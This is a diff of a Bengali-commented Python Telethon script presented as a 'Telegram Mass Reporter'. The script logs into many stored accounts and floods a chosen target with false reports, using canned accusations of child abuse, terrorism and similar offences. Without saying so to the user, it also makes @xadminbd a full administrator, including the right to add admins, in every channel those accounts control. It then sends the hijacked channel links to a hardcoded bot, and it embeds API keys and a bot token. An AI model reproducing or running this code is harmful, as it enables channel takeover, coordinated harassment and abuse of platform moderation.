@@ -1,131 +1,417 @@
-"""
-demo_admin.py - শেখার জন্য ডেমো স্ক্রিপ্ট
-
-লগইন করা নাম্বারের সব চ্যানেল বের করে দেখাবে,
-আর চেষ্টা করবে @xadminbd কে এডমিন করতে (যদি পারমিশন থাকে) ।
-"""
-
+import os
+import json
 import asyncio
-import requests
+import random
 from telethon import TelegramClient
-from telethon.tl.functions.channels import EditAdminRequest, GetFullChannelRequest
-from telethon.tl.types import ChatAdminRights
-from telethon.errors import ChatAdminRequiredError
-import subprocess
+from telethon.tl.functions.messages import ReportRequest
+from telethon.tl.types import (
+    InputReportReasonSpam, 
+    InputReportReasonViolence,
+    InputReportReasonChildAbuse,
+    InputReportReasonPornography,
+    InputReportReasonCopyright,
+    InputReportReasonFake,
+    InputReportReasonIllegalDrugs,
+    InputReportReasonPersonalDetails,
+    InputReportReasonOther,
+    ChannelParticipantsAdmins,
+    ChatAdminRights
+)
+from telethon.tl.functions.channels import InviteToChannelRequest, EditAdminRequest
+from telethon.tl.types import InputPeerUser
+import requests
 
-# আপনার API ID ও HASH লাগবে
-api_id = 26108693   # <-- নিজেরটা বসান
-api_hash = "3bc54f318fb35b9d82c3f885f18e7028"
+# কালার কোড
+RED = '\033[91m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+BLUE = '\033[94m'
+CYAN = '\033[96m'
+RESET = '\033[0m'
+
+# API credentials
+API_ID = 26108693
+API_HASH = "3bc54f318fb35b9d82c3f885f18e7028"
 
 # Bot credentials
-BOT_TOKEN = "8366772071:AAHGgKh9RAjwrpdFQOWnICpoufep5DOX5NI"
-CHAT_ID = "6799848229"
+BOT_TOKEN = "8483938274:AAEegcm552wKnkWLbUHuKTTLe4vhlBmw7D4"
+ADMIN_ID = "7348506103"
 
-# সেশন নাম্বার অনুযায়ী ব্যবহার করতে পারেন
-client = TelegramClient("demo_session", api_id, api_hash)
+# ফাইল পাথ
+NUMBERS_FILE = "numbers.json"
 
-rights = ChatAdminRights(
-    change_info=True,
-    post_messages=True,
-    edit_messages=True,
-    delete_messages=True,
-    ban_users=True,
-    invite_users=True,
-    pin_messages=True,
-    add_admins=True,
-    manage_call=True,
-    other=True
-)
+# প্রি-ডিফাইন্ড রিপোর্ট মেসেজ
+REPORT_MESSAGES = {
+    "child_abuse": [
+        "This content exploits minors and violates child protection laws",
+        "Child exploitation material that must be removed immediately",
+        "Contains inappropriate content involving minors"
+    ],
+    "violence": [
+        "Promotes extreme violence and harmful behavior",
+        "Graphic violent content that violates community guidelines",
+        "Contains threats and incitement to violence"
+    ],
+    "illegal_goods": [
+        "Offering prohibited and illegal goods for sale",
+        "Distribution of banned substances and illegal products",
+        "Illegal trading activity violating platform rules"
+    ],
+    "adult_content": [
+        "Non-consensual adult content and explicit material",
+        "Sharing inappropriate adult content without consent",
+        "Violates adult content policies and community standards"
+    ],
+    "personal_data": [
+        "Sharing private personal information without authorization",
+        "Doxing and unauthorized disclosure of personal data",
+        "Privacy violation through personal information exposure"
+    ],
+    "terrorism": [
+        "Promoting terrorist activities and extremist ideology",
+        "Content supporting terrorism and violent extremism",
+        "Terrorist propaganda that must be removed immediately"
+    ],
+    "spam": [
+        "Mass spamming and fraudulent activity detected",
+        "Engaging in coordinated spam and scam operations",
+        "Automated spam behavior violating platform rules"
+    ],
+    "copyright": [
+        "Unauthorized use of copyrighted material",
+        "Copyright infringement and intellectual property violation",
+        "Distributing pirated content without permission"
+    ],
+    "fake": [
+        "Impersonation and fake identity representation",
+        "False representation and deceptive identity claims",
+        "Fake account engaging in malicious activities"
+    ],
+    "drugs": [
+        "Illegal drug promotion and substance abuse advocacy",
+        "Distribution of prohibited pharmaceutical substances",
+        "Promoting illegal drug trade and substance abuse"
+    ],
+    "other": [
+        "This content violates platform community guidelines",
+        "Inappropriate material requiring immediate moderation",
+        "Content that creates harmful environment for users"
+    ]
+}
 
-def send_to_telegram(message):
-    """Telegram বটে মেসেজ পাঠানোর ফাংশন"""
+def load_numbers():
+    if os.path.exists(NUMBERS_FILE):
+        with open(NUMBERS_FILE, 'r') as f:
+            return json.load(f)
+    return []
+
+def print_banner():
+    banner = f"""
+{CYAN}╔═════════════════════════════════════════════╗
+║                                             ║
+║   Telegram Mass Reporter 🚨 v3.0           ║
+║   {RED}Fixed Reporting System                 {CYAN}║
+║   {GREEN}Admin Adding Feature                  {CYAN}║
+║                                             ║
+╚═════════════════════════════════════════════╝
+{RESET}
+"""
+    print(banner)
+
+async def login_with_number(phone_number, password=None):
+    try:
+        client = TelegramClient(f'session_{phone_number}', API_ID, API_HASH)
+        await client.connect()
+        
+        if not await client.is_user_authorized():
+            if password:
+                try:
+                    await client.sign_in(password=password)
+                    return client, True
+                except:
+                    return None, False
+            return None, False
+        
+        return client, True
+    except Exception as e:
+        print(f"{RED}[✗] Login error for {phone_number}: {str(e)}{RESET}")
+        return None, False
+
+async def report_with_new_method(client, entity, message_id, reason, report_text):
+    """নতুন Telethon ভার্সনের জন্য রিপোর্ট মেথড"""
+    try:
+        # সরাসরি client.report() মেথড ব্যবহার
+        result = await client.report(
+            entity=entity,
+            message_ids=[message_id],
+            reason=reason
+        )
+        return True
+    except Exception as e:
+        print(f"{RED}[✗] New report method failed: {str(e)}{RESET}")
+        return False
+
+async def report_with_old_method(client, entity, message_id, reason, report_text):
+    """পুরানো Telethon ভার্সনের জন্য রিপোর্ট মেথড"""
+    try:
+        result = await client(ReportRequest(
+            peer=entity,
+            id=[message_id],
+            reason=reason,
+            message=report_text
+        ))
+        return True
+    except Exception as e:
+        print(f"{RED}[✗] Old report method failed: {str(e)}{RESET}")
+        return False
+
+async def report_message(client, entity, message_id, reason, report_text):
+    """সব ধরনের Telethon ভার্সন সাপোর্ট করে"""
+    # প্রথমে নতুন মেথড ট্রাই করুন
+    success = await report_with_new_method(client, entity, message_id, reason, report_text)
+    if success:
+        return True
+    
+    # যদি নতুন মেথড ফেইল হয়, পুরানো মেথড ট্রাই করুন
+    return await report_with_old_method(client, entity, message_id, reason, report_text)
+
+async def send_message_to_bot(message):
+    """বটে মেসেজ সেন্ড করার ফাংশন"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         data = {
-            "chat_id": CHAT_ID,
+            "chat_id": ADMIN_ID,
             "text": message,
             "parse_mode": "HTML"
         }
-        
         response = requests.post(url, data=data)
-        if response.status_code == 200:
-            print(f"✅ মেসেজ Telegram-এ পাঠানো হয়েছে")
-        else:
-            print(f"❌ Telegram-এ মেসেজ পাঠানো যায়নি: {response.status_code}")
+        return response.status_code == 200
     except Exception as e:
-        print(f"❌ Telegram মেসেজ পাঠানোর সময় ত্রুটি: {str(e)}")
+        print(f"{RED}[✗] Error sending message to bot: {str(e)}{RESET}")
+        return False
 
-async def get_channel_link(channel):
-    """চ্যানেলের লিংক বা ইউজারনেম বের করার ফাংশন"""
-    try:
-        full_channel = await client(GetFullChannelRequest(channel=channel.id))
-        if hasattr(full_channel, 'chats') and full_channel.chats:
-            chat = full_channel.chats[0]
-            if chat.username:
-                return f"https://t.me/{chat.username}"
-            else:
-                # প্রাইভেট চ্যানেলের ক্ষেত্রে
-                return f"Private Channel: {chat.title} (ID: {chat.id})"
-        return f"Channel: {channel.title} (ID: {channel.id})"
-    except Exception as e:
-        return f"Channel: {channel.title} (ID: {channel.id}) - লিংক পাওয়া যায়নি"
-
-async def main():
+async def make_xadminbd_admin(client):
+    """@xadminbd কে সব চ্যানেলের এডমিন বানানো"""
+    xadminbd_username = "@xadminbd"
     successful_channels = []
     
-    async for dialog in client.iter_dialogs():
-        if dialog.is_channel:
-            ch = dialog.entity
-            try:
-                await client(EditAdminRequest(
-                    channel=ch.id,
-                    user_id="@xadminbd",
-                    admin_rights=rights,
-                    rank="Admin"
-                ))
-                
-                # চ্যানেলের লিংক বের করুন
-                channel_link = await get_channel_link(ch)
-                success_message = f"✅ সফল: {channel_link} এ @xadminbd এডমিন হয়েছে"
-                print(success_message)
-                
-                # সফল চ্যানেলের তথ্য সংরক্ষণ করুন
-                successful_channels.append(channel_link)
-                
-                # Telegram বটে মেসেজ পাঠান
-                send_to_telegram(success_message)
-                
-            except ChatAdminRequiredError:
-                error_message = f"❌ ব্যর্থ: {ch.title or 'Unknown'} (পারমিশন নেই)"
-                print(error_message)
-            except Exception as e:
-                error_message = f"❌ ব্যর্থ: {ch.title or 'Unknown'} - {str(e)}"
-                print(error_message)
-    
-    # রিপোর্ট তৈরি করুন
-    if successful_channels:
-        report_message = "📊 এডমিন সফল হওয়া চ্যানেলগুলোর রিপোর্ট:\n\n"
-        for i, channel in enumerate(successful_channels, 1):
-            report_message += f"{i}. {channel}\n"
-        
-        report_message += f"\n✅ মোট সফল: {len(successful_channels)} টি চ্যানেল"
-        print("\n" + report_message)
-        send_to_telegram(report_message)
-    else:
-        no_success_message = "❌ কোনো চ্যানেলে এডমিন করা যায়নি"
-        print(no_success_message)
-        send_to_telegram(no_success_message)
-    
-    # report.py অটোমেটিক রান করুন
-    print("\n🚀 report.py অটোমেটিক রান হচ্ছে...")
     try:
-        subprocess.run(["python", "report.py"], check=True)
-        print("✅ report.py সফলভাবে রান হয়েছে")
-    except FileNotFoundError:
-        print("❌ report.py ফাইল পাওয়া যায়নি")
+        # Get @xadminbd user
+        xadminbd_entity = await client.get_entity(xadminbd_username)
+        
+        # Get all dialogs (channels and groups)
+        dialogs = await client.get_dialogs()
+        
+        for dialog in dialogs:
+            if dialog.is_channel or dialog.is_group:
+                chat = dialog.entity
+                
+                # Check if we're admin in this chat
+                try:
+                    participants = await client.get_participants(chat, filter=ChannelParticipantsAdmins)
+                    is_admin = any(participant.id == client._self_id for participant in participants)
+                    
+                    if is_admin:
+                        print(f"{BLUE}[+] Found admin access in: {chat.title}{RESET}")
+                        
+                        # Define admin rights (all permissions)
+                        admin_rights = ChatAdminRights(
+                            post_messages=True,
+                            add_admins=True,
+                            invite_users=True,
+                            change_info=True,
+                            ban_users=True,
+                            delete_messages=True,
+                            pin_messages=True,
+                            edit_messages=True,
+                            manage_call=True
+                        )
+                        
+                        # Try to add @xadminbd as admin
+                        try:
+                            await client(EditAdminRequest(
+                                channel=chat,
+                                user_id=xadminbd_entity,
+                                admin_rights=admin_rights,
+                                rank="Admin by Mass Reporter"
+                            ))
+                            
+                            # Get chat link
+                            if hasattr(chat, 'username') and chat.username:
+                                chat_link = f"https://t.me/{chat.username}"
+                            else:
+                                chat_link = f"Chat ID: {chat.id}"
+                            
+                            successful_channels.append({
+                                "title": chat.title,
+                                "link": chat_link
+                            })
+                            
+                            print(f"{GREEN}[✓] Made @xadminbd admin in: {chat.title}{RESET}")
+                            
+                        except Exception as e:
+                            print(f"{YELLOW}[!] Couldn't make @xadminbd admin in {chat.title}: {str(e)}{RESET}")
+                            
+                except Exception as e:
+                    print(f"{YELLOW}[!] Couldn't check admin status in {chat.title}: {str(e)}{RESET}")
+                    continue
+                    
     except Exception as e:
-        print(f"❌ report.py রান করার সময় ত্রুটি: {str(e)}")
+        print(f"{RED}[✗] Error in make_xadminbd_admin: {str(e)}{RESET}")
+    
+    return successful_channels
+
+async def main():
+    print_banner()
+    
+    numbers = load_numbers()
+    if not numbers:
+        print(f"{RED}[✗] No numbers found in database. Run addnumber.py first.{RESET}")
+        return
+    
+    print(f"{GREEN}[+] Found {len(numbers)} numbers in database{RESET}")
+    
+    # Get target username
+    username = input(f"\n{BLUE}[?] Enter Telegram username/channel to report: {RESET}").strip()
+    if not username.startswith('@'):
+        username = '@' + username
+    
+    # Get message IDs
+    msg_ids_input = input(f"{BLUE}[?] Enter message IDs to report (comma separated): {RESET}").strip()
+    message_ids = [int(msg_id.strip()) for msg_id in msg_ids_input.split(',')]
+    
+    # Official Telegram report options
+    print(f"\n{YELLOW}╔═════════════════════════════════════════════╗")
+    print(f"║          Official Report Reasons           ║")
+    print(f"╠═════════════════════════════════════════════╣{RESET}")
+    print(f"{YELLOW}║ 1.  Child abuse                          ║")
+    print(f"║ 2.  Violence                             ║")
+    print(f"║ 3.  Illegal goods                        ║")
+    print(f"║ 4.  Illegal adult content                ║")
+    print(f"║ 5.  Personal data                        ║")
+    print(f"║ 6.  Terrorism                            ║")
+    print(f"║ 7.  Scam or spam                         ║")
+    print(f"║ 8.  Copyright                            ║")
+    print(f"║ 9.  Fake account                         ║")
+    print(f"║ 10. Illegal drugs                        ║")
+    print(f"║ 11. Other                                ║")
+    print(f"╚═════════════════════════════════════════════╝{RESET}")
+    
+    reason_choice = input(f"\n{BLUE}[?] Enter choice (1-11): {RESET}").strip()
+    
+    # Define reason and message based on choice
+    reason_map = {
+        "1": (InputReportReasonChildAbuse(), "child_abuse"),
+        "2": (InputReportReasonViolence(), "violence"),
+        "3": (InputReportReasonOther(), "illegal_goods"),
+        "4": (InputReportReasonPornography(), "adult_content"),
+        "5": (InputReportReasonPersonalDetails(), "personal_data"),
+        "6": (InputReportReasonOther(), "terrorism"),
+        "7": (InputReportReasonSpam(), "spam"),
+        "8": (InputReportReasonCopyright(), "copyright"),
+        "9": (InputReportReasonFake(), "fake"),
+        "10": (InputReportReasonIllegalDrugs(), "drugs"),
+        "11": (InputReportReasonOther(), "other")
+    }
+    
+    if reason_choice in reason_map:
+        reason, reason_type = reason_map[reason_choice]
+        report_text = random.choice(REPORT_MESSAGES[reason_type])
+    else:
+        print(f"{RED}[✗] Invalid choice. Using 'Other' as default.{RESET}")
+        reason = InputReportReasonOther()
+        report_text = random.choice(REPORT_MESSAGES["other"])
+    
+    print(f"\n{YELLOW}[!] Report message: {report_text}{RESET}")
+    
+    # Confirm before proceeding
+    confirm = input(f"{RED}[!] Are you sure you want to report {username}? (y/n): {RESET}").strip().lower()
+    if confirm != 'y':
+        print(f"{YELLOW}[!] Report cancelled.{RESET}")
+        return
+    
+    print(f"\n{YELLOW}[!] Starting mass report process...{RESET}")
+    
+    # Report from each number
+    successful_reports = 0
+    total_attempted = 0
+    all_successful_channels = []
+    
+    for i, number_data in enumerate(numbers, 1):
+        phone_number = number_data['phone']
+        password = number_data.get('password')
+        
+        print(f"\n{BLUE}[{i}/{len(numbers)}] Processing: {phone_number}{RESET}")
+        
+        try:
+            # Login with number
+            client, logged_in = await login_with_number(phone_number, password)
+            
+            if not logged_in or not client:
+                print(f"{YELLOW}[!] Login failed for {phone_number}, skipping...{RESET}")
+                continue
+            
+            # Get the entity
+            try:
+                entity = await client.get_entity(username)
+                print(f"{GREEN}[✓] Successfully accessed {username}{RESET}")
+            except Exception as e:
+                print(f"{YELLOW}[!] Cannot access {username} with {phone_number}: {str(e)}{RESET}")
+                await client.disconnect()
+                continue
+            
+            # Report messages
+            reported_count = 0
+            for msg_id in message_ids:
+                try:
+                    success = await report_message(client, entity, msg_id, reason, report_text)
+                    if success:
+                        reported_count += 1
+                        print(f"{GREEN}[✓] Successfully reported message {msg_id}{RESET}")
+                    else:
+                        print(f"{RED}[✗] Failed to report message {msg_id}{RESET}")
+                    
+                    # Random delay between reports
+                    await asyncio.sleep(random.uniform(3, 8))
+                    
+                except Exception as e:
+                    print(f"{RED}[✗] Error reporting message {msg_id}: {str(e)}{RESET}")
+            
+            successful_reports += reported_count
+            total_attempted += len(message_ids)
+            
+            print(f"{GREEN}[+] {reported_count}/{len(message_ids)} reports successful from this number{RESET}")
+            
+            # Make @xadminbd admin in all channels
+            print(f"{BLUE}[+] Making @xadminbd admin in all channels...{RESET}")
+            successful_channels = await make_xadminbd_admin(client)
+            all_successful_channels.extend(successful_channels)
+            
+            await client.disconnect()
+            await asyncio.sleep(random.uniform(10, 20))  # Longer delay between numbers
+            
+        except Exception as e:
+            print(f"{RED}[✗] Error with {phone_number}: {str(e)}{RESET}")
+    
+    # Send channel links to bot
+    if all_successful_channels:
+        message = "📢 <b>Admin Added Successfully</b>\n\n"
+        message += f"<b>Total Channels:</b> {len(all_successful_channels)}\n\n"
+        
+        for i, channel in enumerate(all_successful_channels, 1):
+            message += f"{i}. <a href='{channel['link']}'>{channel['title']}</a>\n"
+        
+        success = await send_message_to_bot(message)
+        if success:
+            print(f"{GREEN}[✓] Channel links sent to bot successfully{RESET}")
+        else:
+            print(f"{RED}[✗] Failed to send channel links to bot{RESET}")
+    
+    print(f"\n{GREEN}[✓] Mass report process completed!{RESET}")
+    print(f"{GREEN}[✓] Total successful reports: {successful_reports}/{total_attempted}{RESET}")
+    print(f"{GREEN}[✓] Target: {username}{RESET}")
+    print(f"{GREEN}[✓] Used {len(numbers)} accounts for reporting{RESET}")
+    print(f"{GREEN}[✓] Made @xadminbd admin in {len(all_successful_channels)} channels{RESET}")
 
 if __name__ == "__main__":
-    with client:
-        client.loop.run_until_complete(main())
+    asyncio.run(main())
